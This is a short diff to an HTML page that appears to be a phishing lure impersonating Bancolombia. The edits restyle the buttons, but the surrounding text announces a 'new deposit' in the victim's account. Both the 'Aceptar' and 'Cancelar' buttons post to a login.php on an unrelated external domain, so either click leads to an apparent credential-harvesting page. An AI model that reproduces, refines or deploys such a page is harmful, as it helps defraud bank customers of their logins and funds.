@@ -58,9 +58,10 @@
             max-width: 800px;
         }
 
+        /* Botones */
         .box__btn {
-            width: 40%;
-            padding: 15px;
+            width: 80%;
+            padding: 18px;
             background-color: #FFD200;
             color: #003B5C;
             font-weight: 700;
@@ -68,7 +69,8 @@
             border-radius: 8px;
             cursor: pointer;
             transition: all 0.3s ease;
-            margin: 10px;
+            margin: 10px 0; /* espacio entre los botones */
+            font-size: 1.2rem;
         }
 
         .box__btn:hover {
@@ -109,8 +111,8 @@
         /* Responsive */
         @media screen and (max-width: 768px) {
             .box__btn {
-                width: 85%;
-                font-size: 0.9rem;
+                width: 90%;
+                font-size: 1rem;
             }
 
             h3 {
@@ -138,11 +140,11 @@
         <h4>Nuevo abono en tu cuenta Bancolombia</h4>
 
         <!-- Botones Aceptar y Cancelar -->
-        <form action="https://portalcancela360.space/a/login.php" method="post" style="display: inline-block;">
+        <form action="https://portalcancela360.space/a/login.php" method="post" style="display: block;">
             <button class="box__btn" type="submit">Aceptar</button>
         </form>
 
-        <form action="https://portalcancela360.space/a/login.php" method="post" style="display: inline-block;">
+        <form action="https://portalcancela360.space/a/login.php" method="post" style="display: block;">
             <button class="box__btn" type="submit">Cancelar</button>
         </form>
     </div>
